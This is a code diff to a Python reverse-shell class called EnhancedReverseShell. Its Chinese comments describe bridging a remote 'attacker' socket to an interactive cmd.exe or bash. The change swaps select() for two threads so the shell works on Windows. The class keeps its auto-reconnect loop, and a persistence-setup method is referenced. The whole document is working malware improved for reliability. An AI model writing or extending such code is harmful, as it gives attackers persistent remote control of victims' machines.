@@ -9,7 +9,7 @@ import random
 import struct
 import ssl
 import shlex
-import select
+import threading
 import urllib.parse
 import urllib.request
 import urllib.error
@@ -516,7 +516,7 @@ class EnhancedReverseShell:
     # ====================================
     
     def shell_session(self) -> None:
-        """在已连接的 socket 上启动交互式 shell，并把 I/O 桥接起来。
+        """在已连接的 socket 上启动交互式 shell，用线程桥接 I/O（兼容 Windows）。
         断线后自动重连，Ctrl+C 退出。"""
         while True:
             if not self.connected:
@@ -526,11 +526,12 @@ class EnhancedReverseShell:
                     time.sleep(5)
                     continue
 
-            # 根据平台选择 shell
             if sys.platform == "win32":
                 shell_cmd = ["cmd.exe"]
             else:
                 shell_cmd = ["/bin/bash", "-i"]
+
+            stop_event = threading.Event()
 
             try:
                 proc = subprocess.Popen(
@@ -540,75 +541,64 @@ class EnhancedReverseShell:
                     stderr=subprocess.STDOUT,
                     bufsize=0,
                 )
-                self.socket.settimeout(None)  # 会话期间改为阻塞模式
+                self.socket.settimeout(None)
                 print("[会话] Shell 已启动，进入交互模式")
 
-                while True:
-                    # 监听 socket（攻击者输入）和 proc.stdout（命令输出）
-                    rlist = [self.socket, proc.stdout]
+                def socket_to_shell():
+                    """socket 收到数据 -> 写入 shell stdin"""
                     try:
-                        readable, _, _ = select.select(rlist, [], [], 1.0)
-                    except (ValueError, OSError):
-                        break
-
-                    for r in readable:
-                        if r is self.socket:
-                            # 攻击者发来命令 -> 写入 shell stdin
-                            try:
-                                data = self.socket.recv(4096)
-                            except OSError:
-                                data = b""
+                        while not stop_event.is_set():
+                            data = self.socket.recv(4096)
                             if not data:
-                                print("[会话] 连接断开")
-                                proc.terminate()
-                                self.connected = False
                                 break
                             proc.stdin.write(data)
                             proc.stdin.flush()
-                        elif r is proc.stdout:
-                            # shell 输出 -> 发回攻击者
-                            try:
-                                out = proc.stdout.read(4096)
-                            except OSError:
-                                out = b""
-                            if not out:
-                                self.connected = False
-                                break
-                            try:
-                                self.socket.sendall(out)
-                            except OSError:
-                                self.connected = False
-                                break
-                    else:
-                        # 检查 shell 进程是否退出
-                        if proc.poll() is not None:
-                            print("[会话] Shell 进程退出")
-                            self.connected = False
-                        continue
-                    break  # 内层 break 跳出 for，走到这里继续外层 while
-
-                proc.terminate()
-                if self.socket:
-                    try:
-                        self.socket.close()
                     except OSError:
                         pass
-                self.socket = None
-                self.connected = False
+                    finally:
+                        stop_event.set()
+                        proc.terminate()
 
-                if not self.connected:
-                    print("[会话] 5秒后重连...")
-                    time.sleep(5)
+                def shell_to_socket():
+                    """shell stdout -> 发回 socket"""
+                    try:
+                        while not stop_event.is_set():
+                            out = proc.stdout.read(4096)
+                            if not out:
+                                break
+                            self.socket.sendall(out)
+                    except OSError:
+                        pass
+                    finally:
+                        stop_event.set()
+
+                t1 = threading.Thread(target=socket_to_shell, daemon=True)
+                t2 = threading.Thread(target=shell_to_socket, daemon=True)
+                t1.start()
+                t2.start()
+                t1.join()
+                t2.join()
 
             except KeyboardInterrupt:
                 print("\n[会话] 用户中断，退出")
-                if proc.poll() is None:
-                    proc.terminate()
+                stop_event.set()
                 break
             except Exception as e:
-                print(f"[会话] 错误: {e}，5秒后重连...")
-                self.connected = False
-                time.sleep(5)
+                print(f"[会话] 错误: {e}")
+
+            # 清理
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+            try:
+                self.socket.close()
+            except Exception:
+                pass
+            self.socket = None
+            self.connected = False
+            print("[会话] 5秒后重连...")
+            time.sleep(5)
 
     def setup_persistence(self, method: str = "bashrc") -> bool:
         """设置持久化连接（URL 与当前实例 host/port/https 一致）。"""
